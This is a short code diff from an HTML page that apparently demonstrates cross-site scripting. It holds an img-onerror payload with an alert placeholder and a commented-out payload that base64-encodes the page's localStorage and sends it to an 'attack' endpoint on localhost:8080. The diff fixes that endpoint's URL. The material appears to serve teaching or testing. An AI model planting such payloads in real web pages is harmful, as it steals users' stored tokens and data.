@@ -41,7 +41,7 @@
   <script>
     const initialData = `Hello <img src="invalid.png" onerror="alert('Put your own malicious code just here!!!')">`;
 
-    //const initialData = `<img src="invalid.jpg" onerror="var img = document.createElement('img'); img.src = 'http:localhost:8080/attack?value=' + btoa(JSON.stringify(localStorage)); document.querySelector('body').appendChild(img);">`;
+    //const initialData = `<img src="invalid.jpg" onerror="var img = document.createElement('img'); img.src = 'http://localhost:8080/attack?value=' + btoa(JSON.stringify(localStorage)); document.querySelector('body').appendChild(img);">`;
 
       document.addEventListener("DOMContentLoaded", () => {
         document.getElementById("taData").value = initialData;
